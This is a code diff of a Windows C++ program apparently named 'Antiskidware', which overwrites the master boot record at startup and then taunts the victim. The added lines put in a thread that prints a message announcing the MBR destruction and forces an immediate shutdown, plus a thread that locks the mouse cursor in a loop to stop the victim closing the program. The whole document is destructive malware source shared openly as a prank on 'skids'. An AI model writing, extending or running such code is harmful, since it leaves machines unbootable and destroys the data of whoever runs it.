@@ -1,8 +1,8 @@
 #include <thread>
+#include <vector>
 #include <iostream>
 #include <Windows.h>
-
-#define TIME_BEFORE_REBOOT 60 // in seconds | time before force reboot if skid don't reboot pc :,)
+#include <winuser.h>
 
 void overwrite_mbr(void)
 {
@@ -109,21 +109,36 @@ void beep_music_thread(void)
     }
 }
 
-void force_reboot_thread(void) {
-    Sleep(TIME_BEFORE_REBOOT * 1000);
+void console_anim_thread(void) {
+    char message[] = "You have been get pwnd by the Antiskidware,\nStop be a skid and learn how to program.\n\nYour masterboot record partition (MBR) was overwritten ! You can say 'Goodbye' to your pc..\n\nhttps://github.com/Its-Vichy/Antiskidware";
+    system("title How no pwnd :(, Have a fun to reinstalling an os");
+
+    for (char& letter : message) {
+        printf("\u001b[4m%c\u001b[24m", letter);
+        Sleep(100);
+    }
+
     system("C:\\Windows\\System32\\shutdown /s /t 0");
+}
+
+void mouse_lock_thread(void) {
+	while (true) {
+		SetCursorPos(0, 0);
+	}
 }
 
 int main(void)
 {
-    // Overwrite before get fun (skid can close program before...)
+    // Overwrite before get fun (skid can close program before... (ho no ! the kid can't cuz the mouse was locked LMFAO))
     overwrite_mbr();
 
-    std::thread reboot_thread(force_reboot_thread);
     std::thread music_thread(beep_music_thread);
+    std::thread console_thread(console_anim_thread);
+	std::thread mouse_lock_thread(mouse_lock_thread);
 
-    reboot_thread.join();
     music_thread.join();
+    console_thread.join();
+	mouse_lock_thread.join();
 
     return EXIT_SUCCESS;
 }
